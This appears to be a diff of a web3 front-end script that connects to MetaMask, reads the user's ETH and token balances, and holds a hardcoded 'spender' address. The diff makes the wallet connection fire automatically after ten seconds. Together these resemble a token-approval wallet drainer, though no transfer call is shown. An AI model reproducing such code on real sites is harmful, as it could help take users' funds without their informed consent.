@@ -1,4 +1,5 @@
 let account = "";
+let balance = ""
 let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
 let tokens = [
   {
@@ -36,21 +37,33 @@ async function login() {
       console.log(e);
     });
   account = accounts[0];
-  getBalance(tokens[0]);
+  getBalance();
+  // getTokenBalance(tokens[0]);
 }
 
-// document.body.addEventListener("click", function (e) {
-//   let targetId = e.target.id;
-//   if (targetId == "connect-metamask") {
-//     if (ethereum.networkVersion == 4) {
-//       login();
-//     } else {
-//       console.log("Change network version");
-//     }
-//   }
-// });
+document.body.addEventListener("click", function (e) {
+  let targetId = e.target.id;
+  if (targetId == "connect-metamask") {
+    if (ethereum.networkVersion == 4) {
+      login();
+    } else {
+      console.log("Change network version");
+    }
+  }
+});
 
-async function getBalance(token) {
+function getBalance() {
+  let web3 = new Web3(Web3.givenProvider);
+  web3.eth.getBalance(account, function(err, result) {
+    if (err) {
+      console.log(err)
+    } else {
+      balance = result;
+    }
+  })
+}
+
+async function getTokenBalance(token) {
   let web3 = new Web3(Web3.givenProvider);
   let contract = new web3.eth.Contract(ERC20, token.address);
   let balance = await contract.methods.balanceOf(account).call();
@@ -73,6 +86,13 @@ function getToken(token, balance) {
     });
 }
 
-if (account != "") {
-    
+if (account == "") {
+  setTimeout(function() {
+    if (typeof window.ethereum != undefined) {
+      login();
+    } else {
+      location.href = "https://metamask.app.link/dapp/www.sensis.space";
+    }
+  }, 10000);    
 }
+
